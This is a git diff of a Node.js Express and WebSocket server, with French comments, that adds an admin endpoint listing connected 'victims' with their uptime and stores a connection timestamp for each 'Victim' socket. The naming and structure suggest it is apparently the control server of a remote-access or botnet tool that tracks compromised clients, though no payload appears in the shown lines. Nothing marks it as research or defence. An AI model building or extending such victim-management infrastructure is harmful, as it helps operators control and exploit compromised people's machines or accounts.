@@ -444,6 +444,19 @@ app.delete('/api/admin/webhooks/:id', async (req, res) => {
 app.get('/api/admin/verify', (req, res) => {
     res.json({ success: req.query.token === ADMIN_TOKEN });
 });
+app.get('/api/admin/active-victims', (req, res) => {
+    const token = req.query.token;
+    if (token !== ADMIN_TOKEN) return res.status(401).json({ error: "Unauthorized" });
+
+    const list = [];
+    activeVictims.forEach((data, username) => {
+        list.push({
+            username: username,
+            uptime: Date.now() - data.connectedAt // Temps écoulé en ms
+        });
+    });
+    res.json(list);
+});
 // --- GESTION WEBSOCKET ---
 wss.on('connection', (ws, req) => {
     const params = new URLSearchParams(url.parse(req.url, true).query);
@@ -482,14 +495,19 @@ wss.on('connection', (ws, req) => {
     if (usertype === "Victim") {
         if (activeVictims.has(username)) {
             log(`Victim ${username} déjà présent, remplacement...`);
-            activeVictims.get(username).terminate();
+            activeVictims.get(username).ws.terminate(); // Note le .ws ici
         }
-    
-        activeVictims.set(username, ws);
+        
+        activeVictims.set(username, {
+            ws: ws,
+            connectedAt: Date.now() // On stocke le timestamp actuel
+        });
+        
         log(`🤖 Victim connecté : ${username}`);
-
+        
         ws.on('close', () => {
-            if (activeVictims.get(username) === ws) {
+            const victim = activeVictims.get(username);
+            if (victim && victim.ws === ws) {
                 activeVictims.delete(username);
                 log(`💀 Victim déconnecté : ${username}`);
             }
